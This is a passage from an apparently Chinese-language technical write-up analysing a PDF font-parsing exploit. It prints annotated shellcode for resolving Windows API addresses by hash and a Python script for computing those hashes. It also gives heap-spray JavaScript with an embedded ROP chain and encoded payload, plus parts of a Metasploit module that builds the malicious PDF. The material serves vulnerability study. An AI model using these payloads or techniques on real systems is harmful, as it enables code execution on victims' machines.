exports.</span></span><br><span class="line"><span class="comment">; 注意：此函数不能被转发导出</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">api_call:</span></span><br><span class="line">  <span class="keyword">pushad</span>                     <span class="comment">; 我们为调用者保留所有的寄存器,eax和ecx除外。</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span>               <span class="comment">; 创建新的栈帧</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">edx</span>, <span class="built_in">edx</span>               <span class="comment">; edx=0x0</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">fs</span>:<span class="built_in">edx</span>+<span class="number">0x30</span>]     <span class="comment">; 获得PEB的指针</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">edx</span>+<span class="number">0xc</span>]         <span class="comment">; PEB-&gt;Ldr,_PEB_LDR_DATA结构体的指针</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">edx</span>+<span class="number">0x14</span>]        <span class="comment">; 从InMemoryOrderModuleList获取第一个模块,_PEB_LDR_DATA-&gt;InMemoryOrderModuleList(_LDR_DATA_TABLE_ENTRY-&gt;InMemoryOrderLinks)</span></span><br><span class="line"><span class="symbol">next_mod:</span>                    <span class="comment">;</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">edx</span>+<span class="number">0x28</span>]        <span class="comment">; 获取modules名字的指针(unicode字符串),_LDR_DATA_TABLE_ENTRY-&gt;BaseDllName-&gt;Buffer</span></span><br><span class="line">  <span class="keyword">movzx</span> <span class="built_in">ecx</span>, <span class="built_in">word</span> [<span class="built_in">edx</span>+<span class="number">0x26</span>] <span class="comment">; 将ECX设置为我们要检查的长度,_LDR_DATA_TABLE_ENTRY-&gt;BaseDllName-&gt;MaximumLength</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">edi</span>, <span class="built_in">edi</span>               <span class="comment">; 清除EDI，它将存储modules名字的hash</span></span><br><span class="line"><span class="symbol">loop_modname:</span>                <span class="comment">;</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span>               <span class="comment">; 清除EAX</span></span><br><span class="line">  <span class="keyword">lodsb</span>                      <span class="comment">; 读入名称的一个字节至al,esi=esi+1(DF=0)</span></span><br><span class="line">  <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="string">'a'</span>                <span class="comment">; 一些版本的Windows使用小写modules名字</span></span><br><span class="line">  <span class="keyword">jl</span> not_lowercase           <span class="comment">; 不是小写的情况</span></span><br><span class="line">  <span class="keyword">sub</span> <span class="built_in">al</span>, <span class="number">0x20</span>               <span class="comment">; 如果modules名字使用的是小写，则归一化为大写</span></span><br><span class="line"><span class="symbol">not_lowercase:</span>               <span class="comment">;</span></span><br><span class="line">  <span class="keyword">ror</span> <span class="built_in">edi</span>, <span class="number">0xd</span>               <span class="comment">; 循环右移我们的hash值</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">edi</span>, <span class="built_in">eax</span>               <span class="comment">; 加上读入的名称的当前字节</span></span><br><span class="line">  <span class="keyword">dec</span> <span class="built_in">ecx</span>                    <span class="comment">; 长度减1</span></span><br><span class="line">  <span class="keyword">jnz</span> loop_modname           <span class="comment">; 循环,直到长度为0</span></span><br><span class="line">  <span class="comment">; 现在,我们已经计算出了modules名字的hash</span></span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">edx</span>                   <span class="comment">; 将modules list的当前位置保存(_LDR_DATA_TABLE_ENTRY-&gt;InMemoryOrderLinks)，以备后用</span></span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">edi</span>                   <span class="comment">; 保存当前modules的hash，以备后用</span></span><br><span class="line">  <span class="comment">; 继续迭代导出地址表</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">edx</span>+<span class="number">0x10</span>]        <span class="comment">; 获得此modules基地址,_LDR_DATA_TABLE_ENTRY-&gt;InMemoryOrderLinks+0x10=_LDR_DATA_TABLE_ENTRY-&gt;DllBase</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">edx</span>+<span class="number">0x3c</span>]        <span class="comment">; 获得PE header偏移,e_flanew</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules基地址,得到PE header的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span>+<span class="number">0x78</span>]        <span class="comment">; 获得导出表(Export Directory)的RVA,_IMAGE_EXPORT_DIRECTORY结构体指针</span></span><br><span class="line">  <span class="keyword">test</span> <span class="built_in">eax</span>, <span class="built_in">eax</span>              <span class="comment">; 测试是否不存在导出表</span></span><br><span class="line">  <span class="keyword">jz</span> get_next_mod1           <span class="comment">; 如果导出表不存在,处理下一个模块</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules基地址,得到导出表(Export Directory)的虚拟地址</span></span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                   <span class="comment">; 保存当前modules导出表(Export Directory)的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">eax</span>+<span class="number">0x18</span>]        <span class="comment">; 获取以名称导出的函数总数,_IMAGE_EXPORT_DIRECTORY-&gt;NumberOfNames</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebx</span>, [<span class="built_in">eax</span>+<span class="number">0x20</span>]        <span class="comment">; 获取函数名表的RVA,_IMAGE_EXPORT_DIRECTORY-&gt;AddressOfNames</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">ebx</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules基地址,得到函数名表的虚拟地址</span></span><br><span class="line">  <span class="comment">; 计算模块哈希+函数哈希</span></span><br><span class="line"><span class="symbol">get_next_func:</span>               <span class="comment">;</span></span><br><span class="line">  <span class="keyword">test</span> <span class="built_in">ecx</span>, <span class="built_in">ecx</span>              <span class="comment">; 从jecxz更改,以适应下面的随机jmp产生的较大偏移</span></span><br><span class="line">  <span class="keyword">jz</span> get_next_mod            <span class="comment">; 当我们到达Export Address Table表头的时候(向后搜索),表示遍历完成,处理下一个模块</span></span><br><span class="line">  <span class="keyword">dec</span> <span class="built_in">ecx</span>                    <span class="comment">; 减小函数名称计数器</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">ebx</span>+<span class="built_in">ecx</span>*<span class="number">4</span>]       <span class="comment">; 获得函数名称字符串的相对虚拟地址</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">esi</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules基地址,得到函数名称字符串的虚拟地址</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">edi</span>, <span class="built_in">edi</span>               <span class="comment">; 清除edi,其将用来存储函数名的hash</span></span><br><span class="line">  <span class="comment">; 将计算出的hash与我们想寻找的函数的hash进行比较</span></span><br><span class="line"><span class="symbol">loop_funcname:</span>               <span class="comment">;</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span>               <span class="comment">; 清除eax</span></span><br><span class="line">  <span class="keyword">lodsb</span>                      <span class="comment">; 读取函数名(ASCII字符串)的一个字节,esi=esi+1</span></span><br><span class="line">  <span class="keyword">ror</span> <span class="built_in">edi</span>, <span class="number">0xd</span>               <span class="comment">; 循环右移我们的hash值</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">edi</span>, <span class="built_in">eax</span>               <span class="comment">; 加上从函数名中读出的当前字节</span></span><br><span class="line">  <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">ah</span>                 <span class="comment">; 比较al(当前读出的函数名中的字节)和ah(null)</span></span><br><span class="line">  <span class="keyword">jne</span> loop_funcname          <span class="comment">; 如果不相等,则表示还没到达终止符,继续遍历函数名</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">edi</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]           <span class="comment">; 将当前模块的hash值与函数名的hash值相加</span></span><br><span class="line">  <span class="keyword">cmp</span> <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">0x24</span>]        <span class="comment">; 将计算出的hash与我们想寻找的函数的hash进行比较 </span></span><br><span class="line">  <span class="keyword">jnz</span> get_next_func          <span class="comment">; 如果没有找到,则继续计算下一个函数的hash</span></span><br><span class="line">  <span class="comment">; 如果找到，则修复栈，调用该函数，然后值，否则计算下一个</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">eax</span>                    <span class="comment">; 从栈上取出当前module的导出表(Export Directory)的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebx</span>, [<span class="built_in">eax</span>+<span class="number">0x24</span>]        <span class="comment">; 获得导出函数序号表(Export Ordinals Table)的相对虚拟地址</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">ebx</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules的基地址,得到导出函数序号表(Export Ordinals Table)的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">cx</span>, [<span class="built_in">ebx</span>+<span class="number">2</span>*<span class="built_in">ecx</span>]        <span class="comment">; 获得所需的函数的序号</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebx</span>, [<span class="built_in">eax</span>+<span class="number">0x1c</span>]        <span class="comment">; 获得导出函数地址表(Export Address Table)的相对虚拟地址</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">ebx</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules的基地址,得到导出函数地址表(Export Address Table)的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebx</span>+<span class="number">4</span>*<span class="built_in">ecx</span>]       <span class="comment">; 获得所需的函数的相对虚拟地址</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules的基地址,得到所需函数的虚拟地址</span></span><br><span class="line">  <span class="comment">; 现在，我们修复栈并执行对所需函数的调用...</span></span><br><span class="line"><span class="symbol">finish:</span></span><br><span class="line">  <span class="keyword">mov</span> [<span class="built_in">esp</span>+<span class="number">0x24</span>], <span class="built_in">eax</span>        <span class="comment">; 使用所需的api地址覆盖旧的eax值,为即将到来的popad做准备</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ebx</span>                    <span class="comment">; 清除当前modules的hash</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ebx</span>                    <span class="comment">; 清除modules list的当前位置</span></span><br><span class="line">  <span class="keyword">popad</span>                      <span class="comment">; 恢复所有的调用者的寄存器,除了eax,ecx,edx外,他们在clobbered寄存器列表中</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ecx</span>                    <span class="comment">; 弹出我们的调用者存放在栈上的原始的返回地址</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">edx</span>                    <span class="comment">; 弹出我们的调用者存放在栈上的所需函数的hash值</span></span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">ecx</span>                   <span class="comment">; 将正确的返回地址放在栈上</span></span><br><span class="line">  <span class="keyword">jmp</span> <span class="built_in">eax</span>                    <span class="comment">; 跳转至寻找到的所需的api函数</span></span><br><span class="line">  <span class="comment">; 我们现在自动返回至正确的调用者所在的函数</span></span><br><span class="line"><span class="symbol">get_next_mod:</span>                <span class="comment">;</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">eax</span>                    <span class="comment">; 弹出当前modules导出表(Export Directory)的虚拟地址</span></span><br><span class="line"><span class="symbol">get_next_mod1:</span>               <span class="comment">;</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">edi</span>                    <span class="comment">; 弹出当前modules的hash</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">edx</span>                    <span class="comment">; 恢复modules list的当前位置</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">edx</span>]             <span class="comment">; 获取下一个module,_LDR_DATA_TABLE_ENTRY-&gt;InMemoryOrderLinks-&gt;Flink</span></span><br><span class="line">  <span class="keyword">jmp</span> next_mod               <span class="comment">; 处理当前模块</span></span><br></pre></td></tr></table></figure><blockquote><p>调用<code>WinExec()</code>函数时参数如下：</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0C0C0D40   041E00B4  +-<span class="keyword">CALL</span> 到 WinExec 来自 041E00B2</span><br><span class="line">0C0C0D44   041E00D3  | CmdLine = <span class="string">"calc.exe"</span></span><br><span class="line">0C0C0D48   <span class="number">00000001</span>  +-ShowState = SW_SHOWNORMAL</span><br></pre></td></tr></table></figure><blockquote><p><code>shellcode</code>中计算<code>api函数hash</code>的算法如下(<code>dll名称</code>使用的是<code>大写字母</code>的<code>unicode</code>字符串)：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">dll_name = <span class="string">"KERNEL32.DLL\x00"</span></span><br><span class="line"><span class="comment"># dll_name = "NTDLL.DLL\x00"</span></span><br><span class="line">func_name = <span class="string">"WinExec\x00"</span></span><br><span class="line"><span class="comment"># func_name = "ExitProcess\x00"</span></span><br><span class="line"><span class="comment"># func_name = "RtlExitUserThread\x00"</span></span><br><span class="line"></span><br><span class="line">bit = <span class="number">32</span> <span class="comment"># Hash位数</span></span><br><span class="line">K = <span class="number">0xD</span> <span class="comment"># 移位数</span></span><br><span class="line">dll_name_hash = <span class="number">0</span></span><br><span class="line">func_name_hash = <span class="number">0</span></span><br><span class="line">api_hash = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circular_shift_right</span> <span class="params">(int_value,k,bit)</span>:</span> </span><br><span class="line">    format_string = <span class="string">'&#123;:0%db&#125;'</span> % bit </span><br><span class="line">    bin_value = format_string.format(int_value) <span class="comment"># 32 bit binary </span></span><br><span class="line">    bin_value = bin_value[-k:] + bin_value[:-k] </span><br><span class="line">    int_value = int(bin_value,<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">return</span> int_value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ascii2unicode</span><span class="params">(ascsii_str)</span>:</span></span><br><span class="line">    unicode_str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> ascsii_str:</span><br><span class="line">        unicode_str += c</span><br><span class="line">        unicode_str += chr(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> unicode_str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_hash</span><span class="params">(name_string)</span>:</span></span><br><span class="line">    name_hash = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> name_string:</span><br><span class="line">        name_hash = circular_shift_right(name_hash,K,bit)</span><br><span class="line">        name_hash += ord(c)</span><br><span class="line">    <span class="keyword">return</span> name_hash</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    dll_name_unicode = ascii2unicode(dll_name)</span><br><span class="line">    dll_name_hash = calc_hash(dll_name_unicode)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"dll_name_hash:"</span> + <span class="string">"&#123;:x&#125;"</span>.format(dll_name_hash).upper()</span><br><span class="line">    func_name_hash = calc_hash(func_name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"func_name_hash:"</span> + <span class="string">"&#123;:x&#125;"</span>.format(func_name_hash).upper()</span><br><span class="line">    api_hash = dll_name_hash + func_name_hash</span><br><span class="line">    <span class="keyword">if</span> api_hash &gt; <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">        api_hash = api_hash - <span class="number">0x100000000</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"api_hash:"</span> + <span class="string">"&#123;:x&#125;"</span>.format(api_hash).upper()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="0x42-Heap-Spray"><a href="#0x42-Heap-Spray" class="headerlink" title="0x42 Heap Spray"></a>0x42 Heap Spray</h3><p>&emsp;&emsp;在进行<code>Heap Spray</code>时，我们一般会将EIP控制到<code>0x0C0C0C0C</code>，利用<code>javascript</code>申请大量的<code>堆内存块</code>，并用包含着<code>0x90(nop)</code>和<code>shellcode</code>的内存片覆盖这些内存。通常javascript会<code>从内存低址向高址</code>分配内存，因此申请的内存<code>超过200MB</code>(200MB=200x1024x1024=0x0C800000&gt;0x0C0C0C0C)后，<code>0x0C0C0C0C</code>就会被含有<code>shellcode</code>的内存块覆盖。只要内存片中的<code>0x90</code>能够命中<code>0x0C0C0C0C</code>的位置，通过<code>滑行</code>，就可以执行到<code>shellcode</code>。</p><p>&emsp;&emsp;我们可以通过<code>PDFStreamDumper</code>看到内嵌的<code>javascript</code>代码。我们看到的代码是经过<code>混淆</code>的，所以将其复制出，将一些<code>变量名</code>和<code>对象名</code>进行重命名后，得到如下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>( <span class="string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u6dba%u42a5%udd5e%ud9c4%u2474%u5df4%uc931%u31b1%uc583%u3104%u0f55%u5503%u4762%ua2b7%u0594%u5b38%u6a64%ubeb0%uaa55%ucba6%u1ac5%u9eac%ud1e9%u0ae0%u977a%u3c2c%u12cb%u730b%u0fcc%u126f%u524e%uf4bc%u9d6f%uf5b1%uc0a8%ua738%u8e61%u58ef%uda06%ud233%uca54%u0733%ued2c%u9612%ub427%u18b4%ucce4%u02fc%ue9e9%ub9b7%u86d9%u6849%u6610%u55e5%u959d%u92f7%u4619%uea82%ufb5a%u2895%u2721%uab13%uac81%u1783%u6030%ud355%ucd3e%ubb11%ud022%ub7f6%u595e%u17f9%u19d7%ub3de%ufabc%ue57f%uac18%uf580%u11c3%u7d25%u46e9%udc54%u9867%u5aea%u9ac5%u64f4%uf379%uefc5%u8416%u25d9%u7a53%u6490%u13f5%ufd7d%u7e44%u2b7e%u878a%udefd%u7c72%uab1d%u3877%u4799%u5105%u684c%u52ba%u0b45%uc15d%ue205%u61f8%ufaaf'</span> );</span><br><span class="line"><span class="keyword">var</span> nop = <span class="built_in">unescape</span>( <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> ); <span class="comment">//nop.length=2,unicode字符数</span></span><br><span class="line"><span class="keyword">while</span> (nop.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) <span class="comment">//2^16=65536,0x10000,nop长度最终为0x20000字节(128KB),这里的(+20+8)感觉没什么作用</span></span><br><span class="line">    nop+=nop;</span><br><span class="line">temp_chip = nop.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>); <span class="comment">//精准堆喷</span></span><br><span class="line">temp_chip += shellcode;</span><br><span class="line">temp_chip += nop;</span><br><span class="line">memory_chip = temp_chip.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);  <span class="comment">//memory_chip长度为0x10000字节(64KB)</span></span><br><span class="line"><span class="keyword">while</span>(memory_chip.length &lt; <span class="number">0x80000</span>)             <span class="comment">//memory_chip长度最终为0x80000*2=0x100000字节(1MB)</span></span><br><span class="line">    memory_chip += memory_chip;</span><br><span class="line">memory_chip_reduce = memory_chip.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>) / <span class="number">2</span>); <span class="comment">//加快堆喷速度(0x20+0x1000-0x8),对齐大小0x1000,x86使用的页面大小为4K</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> memory = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (count = <span class="number">0</span>; count &lt; <span class="number">0x1f0</span>; count++) <span class="comment">//0x1F0=496</span></span><br><span class="line">    memory[count] = memory_chip_reduce + <span class="string">"s"</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;平常看到的<code>Heap Spray</code>代码都是使用<code>%u9090(NOP)</code>进行填充，看到这个漏洞的<code>Heap Spray</code>代码有点蒙逼，然后百度了一下，发现<code>%u0C0C</code>相当于<code>OR AL,0CH</code>，虽然说用到了AL，但是这肯定与后面的<code>shellcode</code>代码无关，所以也就相当于啥也没做。一般对<code>Heap Spray</code>的内存块填充以<code>NOP SLED + ShellCode</code>形式进行<code>填充</code>，NOP SLED在整个内存块中所占<code>比例较大</code>，所以当控制EIP转到<code>0x0C0C0C0C</code>执行时，命中<code>NOP SLED</code>的几率比较大。但是此漏洞使用的堆喷代码进行了<code>精准堆喷</code>,使地址<code>0x0C0C0C0C</code>处的代码就是用于<code>漏洞利用的有效代码</code>。由于<code>Windows</code>系统的<code>分配粒度</code>为<code>64KB</code>,所以分配到的<code>堆块首地址</code>的对齐大小为<code>0x10000</code>,堆块大小为<code>0x100000(1MB)</code>。我们只要让每个内存块中地址为<code>0x....0C0C</code>处的代码为<code>漏洞利用的有效代码</code>,就可以做到<code>精准堆喷</code>。为了<code>加快堆喷</code>的速度,我们可以将<code>1MB内存块</code>中,最后一个<code>0x10000</code>内存片中<code>shellcode后面</code>的数据剪掉,避免<code>无用数据</code>的赋值,就可以加快堆喷的速度。</p><p>&emsp;&emsp;从上面的代码可知，我们是用大小为<code>65536B</code>的数据填充<code>1MB</code>的内存块，每块数据的起始地址都是<code>0x....0000</code>,从<code>temp_chip = nop.substring(0, (0x0c0c-0x24)/2);</code>这句可以看出，是为了将<code>shellcode</code>放置在每个数据块(65536B)偏移为<code>0x0C0C-0x24</code>的位置。0x24(36 bytes=32+4)是因为申请到的内存块拥有一些<code>额外的信息</code>，为了精确的计算出偏移，所以要将这部分信息所占的内存减去。所以，当我们控制EIP跳转到<code>0x0C0C0C0C</code>时，可以直接执行<code>shellcode</code>。</p><table><thead><tr><th style="text-align:left"></th><th style="text-align:left">SIZE</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">header</td><td style="text-align:left">32 bytes</td><td style="text-align:left">堆块信息头</td></tr><tr><td style="text-align:left">string length</td><td style="text-align:left">4 bytes</td><td style="text-align:left">字符串长度</td></tr><tr><td style="text-align:left">terminator</td><td style="text-align:left">2 bytes</td><td style="text-align:left">字符串终止符，两个字节的NULL</td></tr></tbody></table><h3 id="0x43-Exploit脚本分析"><a href="#0x43-Exploit脚本分析" class="headerlink" title="0x43 Exploit脚本分析"></a>0x43 Exploit脚本分析</h3><h4 id="1、exploit"><a href="#1、exploit" class="headerlink" title="1、exploit()"></a>1、exploit()</h4><p>&emsp;&emsp;Exploit脚本位置在metasploit-framework/modules/exploits/windows/fileformat,其主函数为exploit,内容如下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span></span></span><br><span class="line">    ttf_data = make_ttf() <span class="comment"># 构造ttf字体数据,SING表内容就在其中</span></span><br><span class="line"></span><br><span class="line">    js_data = make_js(payload.encoded) <span class="comment"># 构建Heap Spary js代码,ROP Chain及Payload就包含在里面</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create the pdf</span></span><br><span class="line">    pdf = make_pdf(ttf_data, js_data) <span class="comment"># 构造pdf文件数据,将前面构造好的ttf字体数据和js代码放入其中</span></span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">"Creating '<span class="subst">#&#123;datastore[<span class="string">'FILENAME'</span>]&#125;</span>' file..."</span>)</span><br><span class="line"></span><br><span class="line">    file_create(pdf) <span class="comment"># 创建pdf文件</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h4 id="2、make-ttf"><a href="#2、make-ttf" class="headerlink" title="2、make_ttf()"></a>2、make_ttf()</h4><p>&emsp;&emsp;此函数首先打开了一个<code>正常的ttf模板</code>文件,然后构造了<code>SING表</code>数据,将<code>ttf字体</code>文件中的<code>name表</code>数据替换为<code>构造的SING表</code>数据,<code>“name”</code>字符串替换为<code>“SING”</code>。<code>构造的SING表数据</code>包括用于将程序控制流劫持到<code>Heap Spary代码</code>处执行的<code>ROP Chain</code>,以及溢出后、获得程序控制流之前,用于绕过<code>造成程序执行出错</code>的数据。这部分在前面分析<code>此漏洞是怎样触发</code>的时候,介绍过。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td 